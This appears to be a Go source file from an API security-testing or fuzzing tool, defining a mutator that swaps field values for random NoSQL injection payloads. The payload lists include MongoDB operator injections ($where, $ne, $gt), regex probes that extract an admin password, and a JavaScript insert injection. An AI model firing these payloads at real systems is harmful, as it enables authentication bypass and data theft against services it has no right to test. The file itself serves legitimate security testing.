package mutation

import (
	"encoding/json"
	"math/rand"
	"reflect"
)

var nosqlInjectionObjectPayloads = []string{
	`{"$where":"1==1"}`,
	`{"$where":"1"}`,
	`{"$or":"1==1"}`,
	`{"$or":"1"}`,
	`{"$gt": ""}`,
	`{"username": {"$eq": "admin"}, "password": {"$regex": "^m" }}`,
	`{"username": {"$eq": "admin"}, "password": {"$regex": "^md" }}`,
	`{"username": {"$eq": "admin"}, "password": {"$regex": "^mdp" }}`,
}

var nosqlInjectionStringPayloads = []string{
	`true, $where: '1 == 1'`,
	`, $where: '1 == 1'`,
	`$where: '1 == 1'`,
	`', $where: '1 == 1'`,
	`1, $where: '1 == 1'`,
	`{ $ne: 1 }`,
	`', $or: [ {}, { 'a':'a`,
	`' } ], $comment:'successful MongoDB injection'`,
	`db.injection.insert({success:1});`,
	`db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1`,
	`|| 1==1`,
	"' && this.password.match(/.*/)//+\x00",
	"' && this.passwordzz.match(/.*/)//+\x00",
	"'\x20\x26\x26\x20this.password.match(/.*/)//+\x00",
	"'\x20\x26\x26\x20this.passwordzz.match(/.*/)//+\x00",
	`{$gt: ''}`,
	`[$ne]=1`,
}

// NoSQLInjection replaces a value with a random NoSQL injection payload.
// For more information on NoSQL injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection
// Example: Hello -> true, $where: '1 == 1
type NoSQLInjection struct{}

// ID returns mutator's 3-digit ID.
func (m *NoSQLInjection) ID() string {
	return "015"
}

// Name returns the mutator's name.
func (m *NoSQLInjection) Name() string {
	return "NoSQL Injection"
}

// Description returns the mutator's description.
func (m *NoSQLInjection) Description() string {
	return "Replace value with random NoSQL Injection payload"
}

// CompatibleKinds returns the data types that the mutator can mutate.
func (m *NoSQLInjection) CompatibleKinds() []reflect.Kind {
	return []reflect.Kind{reflect.String, reflect.Int, reflect.Int8, reflect.Int16, reflect.Int32, reflect.Int64, reflect.Uint, reflect.Uint8, reflect.Uint16, reflect.Uint32, reflect.Uint64, reflect.Float32, reflect.Float64, reflect.Invalid}
}

// Mutate returns a random NoSQL injection payload.
// Payload with either be a simple string payload, or a more complex object.
// Example: true, $where: '1 == 1
func (m *NoSQLInjection) Mutate(subject reflect.Value, r *rand.Rand) interface{} {
	if r.Intn(2) == 1 {
		return nosqlInjectionStringPayloads[r.Intn(len(nosqlInjectionStringPayloads))]
	}
	var payload interface{}
	json.Unmarshal([]byte(nosqlInjectionObjectPayloads[r.Intn(len(nosqlInjectionObjectPayloads))]), &payload)
	return payload
}
